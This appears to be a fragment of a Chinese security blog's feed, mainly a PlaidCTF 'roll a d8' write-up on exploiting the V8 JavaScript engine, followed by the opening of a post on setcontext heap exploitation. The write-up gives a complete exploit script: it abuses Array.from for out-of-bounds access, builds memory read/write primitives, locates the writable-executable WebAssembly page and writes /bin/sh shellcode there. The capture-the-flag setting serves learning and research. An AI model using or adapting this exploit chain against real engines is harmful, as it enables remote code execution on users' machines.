class="string">)&gt;</span></span><br><span class="line"><span class="attr"> - elements:</span> <span class="number">0x3b6d4ec02251</span> <span class="string">&lt;FixedArray[0]&gt;</span> <span class="string">[HOLEY_ELEMENTS]</span></span><br><span class="line"><span class="bullet"> -</span> <span class="string">function</span> <span class="attr">prototype:</span> <span class="string">&lt;no-prototype-slot&gt;</span></span><br><span class="line"><span class="attr"> - shared_info:</span> <span class="number">0x10d0c0027cd1</span> <span class="string">&lt;SharedFunctionInfo</span> <span class="number">0</span><span class="string">&gt;</span></span><br><span class="line"><span class="string"></span><span class="attr"> - name:</span> <span class="number">0x3b6d4ec4f6d9</span> <span class="string">&lt;String[1]:</span> <span class="number">0</span><span class="string">&gt;</span></span><br><span class="line"><span class="string"></span><span class="attr"> - formal_parameter_count:</span> <span class="number">0</span></span><br><span class="line"><span class="attr"> - kind:</span> <span class="string">NormalFunction</span></span><br><span class="line"><span class="attr"> - context:</span> <span class="number">0x10d0c0003eb1</span> <span class="string">&lt;FixedArray[234]&gt;</span></span><br><span class="line"><span class="attr"> - code:</span> <span class="number">0xcb64c90ea61</span> <span class="string">&lt;Code</span> <span class="string">JS_TO_WASM_FUNCTION&gt;</span></span><br><span class="line"><span class="bullet"> -</span> <span class="string">WASM</span> <span class="string">instance</span> <span class="number">0x10d0c0027b31</span></span><br><span class="line">   <span class="string">context</span> <span class="number">0x561d97f177f0</span></span><br><span class="line"><span class="bullet"> -</span> <span class="string">WASM</span> <span class="string">function</span> <span class="string">index</span> <span class="number">0</span></span><br><span class="line"><span class="attr"> - properties:</span> <span class="number">0x2756aed0dde9</span> <span class="string">&lt;PropertyArray[3]&gt;</span> <span class="string">&#123;</span></span><br></pre></td></tr></table></figure></p><p>再通过shared_info找到Code JS_TO_WASM_FUNCTION：<br><figure class="highlight haml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">0x10d0c0027cd1: [SharedFunctionInfo] in OldSpace</span><br><span class="line"> -<span class="ruby"> <span class="symbol">map:</span> <span class="number">0x2dce98482889</span> &lt;Map[<span class="number">128</span>]&gt;</span></span><br><span class="line"><span class="ruby"> - <span class="symbol">name:</span> <span class="number">0x3b6d4ec4f6d9</span> &lt;String[<span class="number">1</span>]: <span class="number">0</span>&gt;</span></span><br><span class="line"><span class="ruby"> - <span class="symbol">kind:</span> NormalFunction</span></span><br><span class="line"><span class="ruby"> - <span class="symbol">function_map_index:</span> <span class="number">128</span></span></span><br><span class="line"><span class="ruby"> - <span class="symbol">formal_parameter_count:</span> <span class="number">0</span></span></span><br><span class="line"><span class="ruby"> - <span class="symbol">expected_nof_properties:</span> <span class="number">0</span></span></span><br><span class="line"><span class="ruby"> - <span class="symbol">language_mode:</span> sloppy</span></span><br><span class="line"><span class="ruby"> - <span class="symbol">code:</span> <span class="number">0xcb64c90ea61</span> &lt;Code JS_TO_WASM_FUNCTION&gt;</span></span><br><span class="line"><span class="ruby"> - function token <span class="symbol">position:</span> <span class="number">0</span></span></span><br><span class="line"><span class="ruby"> - start <span class="symbol">position:</span> <span class="number">0</span></span></span><br><span class="line"><span class="ruby"> - <span class="keyword">end</span> <span class="symbol">position:</span> <span class="number">0</span></span></span><br><span class="line"><span class="ruby"> - no debug info</span></span><br><span class="line"><span class="ruby"> - scope <span class="symbol">info:</span> <span class="number">0x3b6d4ec02459</span> &lt;ScopeInfo[<span class="number">0</span>]&gt;</span></span><br><span class="line"><span class="ruby"> - <span class="symbol">length:</span> <span class="number">0</span></span></span><br><span class="line"><span class="ruby"> - <span class="symbol">feedback_metadata:</span> <span class="number">0x3b6d4ec02931</span>: [FeedbackMetadata] <span class="keyword">in</span> OldSpace</span></span><br><span class="line"><span class="ruby"> - <span class="symbol">map:</span> <span class="number">0x2dce98483071</span> &lt;Map&gt;</span></span><br><span class="line"><span class="ruby"> - <span class="symbol">slot_count:</span> <span class="number">0</span></span></span><br></pre></td></tr></table></figure></p><p>然后在JS_TO_WASM_FUNCTION这里就可以找到函数的入口点:0x5ad5b332000  (wasm function)<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0xcb64c90ea61</span>: [Code]</span><br><span class="line"> - map: <span class="number">0x2dce984828e1</span> &lt;Map&gt;</span><br><span class="line">kind = JS_TO_WASM_FUNCTION</span><br><span class="line">compiler = turbofan</span><br><span class="line">address = <span class="number">0xcb64c90ea61</span></span><br><span class="line">Body (size = <span class="number">67</span>)</span><br><span class="line">Instructions (size = <span class="number">44</span>)</span><br><span class="line"><span class="number">0xcb64c90eac0</span>     <span class="number">0</span>  <span class="number">55</span>             <span class="keyword">push</span> <span class="built_in">rbp</span></span><br><span class="line"><span class="number">0xcb64c90eac1</span>     <span class="number">1</span>  4889e5         REX.W <span class="keyword">movq</span> <span class="built_in">rbp</span>,<span class="built_in">rsp</span></span><br><span class="line"><span class="number">0xcb64c90eac4</span>     <span class="number">4</span>  <span class="number">56</span>             <span class="keyword">push</span> <span class="built_in">rsi</span></span><br><span class="line"><span class="number">0xcb64c90eac5</span>     <span class="number">5</span>  <span class="number">57</span>             <span class="keyword">push</span> <span class="built_in">rdi</span></span><br><span class="line"><span class="number">0xcb64c90eac6</span>     <span class="number">6</span>  48bef077f1971d560000 REX.W <span class="keyword">movq</span> <span class="built_in">rsi</span>,<span class="number">0x561d97f177f0</span>    <span class="comment">;; wasm context reference</span></span><br><span class="line"><span class="number">0xcb64c90ead0</span>    <span class="number">10</span>  49ba0020335bad050000 REX.W <span class="keyword">movq</span> <span class="built_in">r10</span>,<span class="number">0x5ad5b332000</span>  (wasm function)    <span class="comment">;; js to wasm call</span></span><br><span class="line"><span class="number">0xcb64c90eada</span>    1a  41ffd2         <span class="keyword">call</span> <span class="built_in">r10</span></span><br><span class="line"><span class="number">0xcb64c90eadd</span>    <span class="number">1d</span>  48c1e020       REX.W shlq <span class="built_in">rax</span>, <span class="number">32</span></span><br><span class="line"><span class="number">0xcb64c90eae1</span>    <span class="number">21</span>  488be5         REX.W <span class="keyword">movq</span> <span class="built_in">rsp</span>,<span class="built_in">rbp</span></span><br><span class="line"><span class="number">0xcb64c90eae4</span>    <span class="number">24</span>  <span class="number">5d</span>             <span class="keyword">pop</span> <span class="built_in">rbp</span></span><br><span class="line"><span class="number">0xcb64c90eae5</span>    <span class="number">25</span>  c20800         <span class="keyword">ret</span> <span class="number">0x8</span></span><br><span class="line"><span class="number">0xcb64c90eae8</span>    <span class="number">28</span>  <span class="number">90</span>             <span class="keyword">nop</span></span><br><span class="line"><span class="number">0xcb64c90eae9</span>    <span class="number">29</span>  0f1f00         <span class="keyword">nop</span></span><br></pre></td></tr></table></figure></p><p>具体位置是 JS_TO_WASM_FUNCTION - 1 + 0x72 , 该位置是rwx,写入shellcode即可:<br><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; vmmap <span class="number">0x5ad5b332000</span></span><br><span class="line">LEGEND: STACK | <span class="type">HEAP</span> | <span class="type">CODE</span> | <span class="type">DATA</span> | <span class="type">RWX</span> | <span class="type">RODATA</span></span><br><span class="line">     <span class="number">0x5ad5b332000</span>      <span class="number">0x5ad5b333000</span> rwxp     <span class="number">1000</span> <span class="number">0</span></span><br></pre></td></tr></table></figure></p><p>exp如下:(前面获得任意读写参考了<a href="https://xz.aliyun.com/t/5190" target="_blank" rel="noopener">v8 exploit入门 PlaidCTF roll a d8</a>)<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">convert</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">constructor</span>()</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">this</span>.buf=<span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">8</span>)</span><br><span class="line">        <span class="keyword">this</span>.uint8array=<span class="keyword">new</span> <span class="built_in">Uint8Array</span>(<span class="keyword">this</span>.buf);</span><br><span class="line">        <span class="keyword">this</span>.float64array=<span class="keyword">new</span> <span class="built_in">Float64Array</span>(<span class="keyword">this</span>.buf);</span><br><span class="line">        <span class="keyword">this</span>.uint32array=<span class="keyword">new</span> <span class="built_in">Uint32Array</span>(<span class="keyword">this</span>.buf);</span><br><span class="line">    &#125;</span><br><span class="line">    f2i(x)<span class="comment">//float64 ==&gt; uint64</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">this</span>.float64array[<span class="number">0</span>]=x;</span><br><span class="line">        <span class="keyword">let</span> sum = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span> ;i&lt; <span class="number">8</span> ;i ++)</span><br><span class="line">        &#123;</span><br><span class="line">            sum += <span class="keyword">this</span>.uint8array[i]*(<span class="number">0x100</span>**i);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//print(sum.toString(16));</span></span><br><span class="line">        <span class="keyword">return</span> sum;</span><br><span class="line">    &#125;</span><br><span class="line">    i2f(x)<span class="comment">//uint64 ==&gt; float64</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">let</span> tmp = [];</span><br><span class="line">        tmp[<span class="number">0</span>] = (x % <span class="number">0x100000000</span>);</span><br><span class="line">        tmp[<span class="number">1</span>] = ((x - tmp[<span class="number">0</span>]) / <span class="number">0x100000000</span>);</span><br><span class="line">        <span class="keyword">this</span>.uint32array[<span class="number">0</span>]=tmp[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">this</span>.uint32array[<span class="number">1</span>]=tmp[<span class="number">1</span>];</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.float64array[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> conv= <span class="keyword">new</span> convert();</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> buf_array=[];</span><br><span class="line"><span class="keyword">let</span> obj_array=[];</span><br><span class="line"><span class="keyword">let</span> oob_array=[<span class="number">1.1</span>];</span><br><span class="line"><span class="keyword">let</span> maxsize = <span class="number">1028</span>*<span class="number">8</span>;</span><br><span class="line"><span class="built_in">Array</span>.from.call(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;<span class="keyword">return</span> oob_array&#125;,&#123;[<span class="built_in">Symbol</span>.iterator]: <span class="function"><span class="params">_</span> =&gt;</span>(</span><br><span class="line">    &#123;</span><br><span class="line">        counter: <span class="number">0</span> ,</span><br><span class="line">        next()</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">let</span> res=<span class="keyword">this</span>.counter++;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">this</span>.counter&gt;maxsize)</span><br><span class="line">            &#123;</span><br><span class="line">                oob_array.length=<span class="number">1</span>;</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>;i&lt;<span class="number">100</span>;i++)</span><br><span class="line">                &#123;</span><br><span class="line">                    buf_array.push(<span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x1111</span>));</span><br><span class="line">                    obj_array.push(&#123;<span class="string">"a"</span>:<span class="number">0x1234</span>&#125;);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> &#123;<span class="attr">done</span>:<span class="literal">true</span>&#125;;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">return</span> &#123;<span class="attr">value</span>:<span class="number">1.1</span>,<span class="attr">done</span>:<span class="literal">false</span>&#125;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">)</span><br><span class="line">&#125;);</span><br><span class="line"><span class="keyword">let</span> buf_offset ;  <span class="comment">// in oob_array</span></span><br><span class="line"><span class="keyword">let</span> buf_index ; <span class="comment">//in buf_array</span></span><br><span class="line"><span class="keyword">let</span> obj_offset; <span class="comment">// in oob_array</span></span><br><span class="line"><span class="keyword">let</span> obj_index; <span class="comment">// in obj_array</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i&lt; maxsize ; i++)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">let</span> val = conv.f2i( oob_array[i] );</span><br><span class="line">    <span class="keyword">if</span>(val == <span class="number">0x111100000000</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        oob_array[i]=conv.i2f(<span class="number">0x100000000000</span>);</span><br><span class="line">        oob_array[i+<span class="number">2</span>]=conv.i2f(<span class="number">0x1000</span>);</span><br><span class="line">        buf_offset=i;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> ( <span class="keyword">let</span> i = <span class="number">0</span> ;i &lt; maxsize ; i++)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">let</span> val = conv.f2i( oob_array[i] );</span><br><span class="line">    <span class="keyword">if</span>(val == <span class="number">0x123400000000</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        obj_offset=i;</span><br><span class="line">        oob_array[i]=conv.i2f(<span class="number">0x222200000000</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span> ;i &lt; <span class="number">100</span> ; i++)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (buf_array[i].byteLength==<span class="number">0x1000</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        buf_index=i;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i&lt; <span class="number">100</span> ; i++)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(obj_array[i][<span class="string">"a"</span>]==<span class="number">0x2222</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        obj_index=i;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">print(<span class="string">"buf_offset ==&gt; "</span>+buf_offset);</span><br><span class="line">print(<span class="string">"buf_index  ==&gt; "</span>+buf_index);</span><br><span class="line">print(<span class="string">"obj_offset ==&gt; "</span>+obj_offset);</span><br><span class="line">print(<span class="string">"obj_index  ==&gt; "</span>+obj_index);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">tools</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    leak_obj_addr(obj)</span><br><span class="line">    &#123;</span><br><span class="line">        obj_array[obj_index][<span class="string">"a"</span>]=obj;</span><br><span class="line">        <span class="keyword">return</span> conv.f2i(oob_array[obj_offset]);</span><br><span class="line">    &#125;</span><br><span class="line">    read64(addr)</span><br><span class="line">    &#123;</span><br><span class="line">        oob_array[buf_offset+<span class="number">1</span>]=conv.i2f(addr);<span class="comment">//back_store ==&gt; addr</span></span><br><span class="line">        <span class="keyword">let</span> temp= <span class="keyword">new</span> <span class="built_in">Float64Array</span>(buf_array[buf_index]);</span><br><span class="line">        <span class="keyword">return</span> conv.f2i(temp[<span class="number">0</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    write8(addr,x)</span><br><span class="line">    &#123;</span><br><span class="line">        oob_array[buf_offset+<span class="number">1</span>]=conv.i2f(addr);<span class="comment">//back_store ==&gt; addr</span></span><br><span class="line">        <span class="keyword">let</span> temp= <span class="keyword">new</span> <span class="built_in">Uint8Array</span>(buf_array[buf_index]);</span><br><span class="line">        temp[<span class="number">0</span>]=x;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> tool = <span class="keyword">new</span> tools();</span><br><span class="line"></span><br><span class="line"><span class="comment">//let a = [1];</span></span><br><span class="line"><span class="comment">//%DebugPrint(a);</span></span><br><span class="line"><span class="comment">//print(tool.leak_obj_addr(a).toString(16));</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> wasmCode = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>([<span class="number">0</span>,<span class="number">97</span>,<span class="number">115</span>,<span class="number">109</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">133</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">96</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">127</span>,<span class="number">3</span>,<span class="number">130</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">112</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">131</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">6</span>,<span class="number">129</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">7</span>,<span class="number">145</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">109</span>,<span class="number">101</span>,<span class="number">109</span>,<span class="number">111</span>,<span class="number">114</span>,<span class="number">121</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">109</span>,<span class="number">97</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">10</span>,<span class="number">138</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">65</span>,<span class="number">42</span>,<span class="number">11</span>]);</span><br><span class="line"><span class="keyword">var</span> wasmModule = <span class="keyword">new</span> WebAssembly.Module(wasmCode);</span><br><span class="line"><span class="keyword">var</span> wasmInstance = <span class="keyword">new</span> WebAssembly.Instance(wasmModule, &#123;&#125;);</span><br><span class="line"><span class="keyword">var</span> f = wasmInstance.exports.main;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> f_addr=tool.leak_obj_addr(f);</span><br><span class="line">print(<span class="string">"f_addr ==&gt; "</span>+f_addr.toString(<span class="number">16</span>));</span><br><span class="line"><span class="keyword">let</span> share_info=tool.read64(f_addr+<span class="number">0x18</span><span class="number">-0x1</span>)<span class="number">-0x1</span>;</span><br><span class="line">print(<span class="string">"func_info ==&gt; "</span>+share_info.toString(<span class="number">16</span>));</span><br><span class="line"><span class="keyword">let</span> code_addr = tool.read64(share_info+<span class="number">0x8</span>)<span class="number">-0x1</span>;</span><br><span class="line">print(<span class="string">"code_addr ==&gt;"</span> + code_addr.toString(<span class="number">16</span>));</span><br><span class="line"><span class="keyword">let</span> rwx_addr= tool.read64(code_addr+<span class="number">0x72</span>)</span><br><span class="line">print(<span class="string">"rwx_addr ==&gt; "</span>+rwx_addr.toString(<span class="number">16</span>));</span><br><span class="line"></span><br><span class="line">shellcode= <span class="keyword">new</span> <span class="built_in">Uint8Array</span>([<span class="number">106</span>,<span class="number">0</span>,<span class="number">72</span>,<span class="number">141</span>,<span class="number">61</span>,<span class="number">17</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">87</span>,<span class="number">72</span>,<span class="number">141</span>,<span class="number">52</span>,<span class="number">36</span>,<span class="number">72</span>,<span class="number">49</span>,<span class="number">210</span>,<span class="number">72</span>,<span class="number">199</span>,<span class="number">192</span>,<span class="number">59</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">15</span>,<span class="number">5</span>,<span class="number">47</span>,<span class="number">98</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">47</span>,<span class="number">115</span>,<span class="number">104</span>,<span class="number">0</span>])</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; shellcode.length;i++)&#123;</span><br><span class="line"><span class="keyword">var</span> value = shellcode[i];</span><br><span class="line">tool.write8(rwx_addr+i,value);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//%SystemBreak();</span></span><br><span class="line">f();</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言:&quot;&gt;&lt;/a&gt;前言:&lt;/h4&gt;&lt;p&gt;之前花了一段时间学习解释器原理，然后开始学习js引擎的利用.分析一下plaidctf中的roll a d8，虽说是ctf题，但是是真实的
      
    
    </summary>
    
    
      <category term="v8_exploit" scheme="http://yoursite.com/tags/v8-exploit/"/>
    
  </entry>
  
  <entry>
    <title>setcontext利用</title>
    <link href="http://yoursite.com/2019/06/03/setcontext%E5%88%A9%E7%94%A8/"/>
    <id>http://yoursite.com/2019/06/03/setcontext利用/</id>
    <published>2019-06-03T08:48:43.000Z</published>
    <updated>2019-06-03T09:00:50.179Z</updated>
    
    <content type="html"><![CDATA[<h4 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h4><p>利用setcontext函数从*ctf 2019的heap_master就有了，之前比较忙就没有研究，抽时间看了下是如何利用的.</p><blockquote><p>参考了:<br><a href="https://blog.csdn.net/mrpre/article/details/78699865" target="_blank" rel="noopener">https://blog.csdn.net/mrpre/article/details/78699865</a><br><a href="http://blog.eonew.cn/archives/1000#i-5" target="_blank" rel="noopener">http://blog.eonew.cn/archives/1000#i-5</a><br><a href="https://n132.github.io/2019/05/10/2019-05-08-Startctf2019-Heap-master/#setcontext" target="_blank" rel="noopener">https://n132.github.io/2019/05/10/2019-05-08-Startctf2019-Heap-master/#setcontext</a><br><a href="https://github.com/sixstars/starctf2019/blob/master/pwn-heap_master/readMe.Md" target="_blank" rel="noopener">https://github.com/sixstars/starctf2019/blob/master/pwn-heap_master/readMe.Md</a></p></blockquote><h4 id="setcontext："><a href="#setcontext：" class="headerlink" title="setcontext："></a>setcontext：</h4><p>手册上是这样描述的:<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">SYNOPSIS</span><br><span class="line">       #include &lt;ucontext.h&gt;</span><br><span class="line">       int getcontext(ucontext_t *ucp);</span><br><span class="line">       int setcontext(const ucontext_t *ucp);</span><br><span class="line">DESCRIPTION</span><br><span class="line">       <span class="keyword">In</span>  a <span class="built_in"> System </span>V-like environment, one has the two types mcontext_t <span class="keyword">and</span> ucontext_t defined <span class="keyword">in</span> &lt;ucontext.h&gt; </span><br><span class="line">       <span class="keyword">and</span> the four functions getcontext(), setcontext(), makecontext(3), <span class="keyword">and</span> swapcontext(3) </span><br><span class="line">       that allow user-level context switching between multiple threads of control within a process.</span><br><span class="line">       The mcontext_t<span class="built_in"> type </span>is machine-dependent <span class="keyword">and</span> opaque.  The ucontext_t<span class="built_in"> type </span>is a structure that has at least the following fields:</span><br><span class="line"></span><br><span class="line">           typedef struct ucontext &#123;</span><br><span class="line">               struct ucontext *uc_link;</span><br><span class="line">               sigset_t         uc_sigmask;</span><br><span class="line">               stack_t          uc_stack;</span><br><span class="line">               mcontext_t       uc_mcontext;</span><br><span class="line">               <span class="built_in">..</span>.</span><br><span class="line">           &#125; ucontext_t;</span><br></pre></td></tr></table></figure></p><p>这几个函数允许</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;前言：&quot;&gt;&lt;a href=&quot;#前言：&quot; class=&quot;headerlink&quot; title=&quot;前言：&quot;&gt;&lt;/a&gt;前言：&lt;/h4&gt;&lt;p&gt;利用setcontext函数从*ctf 2019的heap_master就有了，之前比较忙就没有研究，抽时间看了下是如何利用的.&lt;/
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>RCTF2019 babyheap</title>
    <link href="http://yoursite.com/2019/05/22/RCTF2019-babyheap/"/>
    <id>http://yoursite.com/2019/05/22/RCTF2019-babyheap/</id>
    <published>2019-05-22T03:20:24.000Z</published>
    <updated>2019-05-24T01:23:38.635Z</updated>
    
